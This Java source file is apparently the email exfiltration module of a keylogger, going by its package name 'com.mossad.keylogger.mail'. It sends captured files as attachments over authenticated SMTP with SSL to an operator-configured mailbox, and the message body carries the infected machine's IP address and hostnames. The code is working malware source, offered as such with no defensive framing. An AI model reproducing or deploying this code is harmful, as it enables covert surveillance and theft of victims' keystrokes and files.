package com.mossad.keylogger.mail;

import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.time.LocalDateTime;
import java.util.List;
import java.util.logging.Logger;

public final class MailSender {

      public static int SMTP_PORT = 465;
      private final Logger LOG = Logger.getLogger(MailSender.class.getCanonicalName());
      private final String mailHostName;
      private final String emailAccount;
      private final String password;
      private final int port;
      private EmailAttachment attachment;
      private MultiPartEmail email;

      public MailSender(String mailHostName, String emailAccount, String password, int port) {
            this.mailHostName = mailHostName;
            this.emailAccount = emailAccount;
            this.password = password;
            this.port = port;
      }

       public void prepareEmailWithAttachment(List<String> files) throws EmailException {
             email = prepareEmail();
             files.forEach(file -> {
                   attachment = prepareEmailAttachment(file);
                   try {
                         email.attach(attachment);
                   }
                   catch (EmailException e) {
                         LOG.warning("Cannot add attachment due to: %s".formatted(e.getMessage()));
                   }
             });
       }

      public void send() throws EmailException {
            email.send();
      }

       private MultiPartEmail prepareEmail() throws EmailException {
             email = new MultiPartEmail();
             email.setHostName(mailHostName);
             email.addTo(emailAccount);
             email.setFrom(emailAccount);
             email.setSubject("AI report: %s".formatted(LocalDateTime.now()));
             email.setMsg(resolveHostName());
             email.setSmtpPort(port);
             email.setSSLOnConnect(true);
             email.setSSLCheckServerIdentity(true);
             email.setBounceAddress(emailAccount);
             email.setAuthentication(emailAccount, password);
             return email;
       }

       private EmailAttachment prepareEmailAttachment(String filePath) {
             attachment = new EmailAttachment();
             attachment.setPath(filePath);
             attachment.setDisposition(EmailAttachment.ATTACHMENT);
             return attachment;
       }

       private String resolveHostName() {
             var stringBuilder = new StringBuilder();
             try {
                   var localhost = InetAddress.getLocalHost();
                   stringBuilder.append(localhost.getHostAddress()).append("\n")
                         .append(localhost.getHostName()).append("\n")
                         .append(localhost.getCanonicalHostName()).append("\n")
                         .append(localhost.toString());
             }
             catch (UnknownHostException e) {
                   stringBuilder.append("\n Host determination failed up due to: %s".formatted(e.getMessage()));
             }
             return stringBuilder.toString();
       }
}
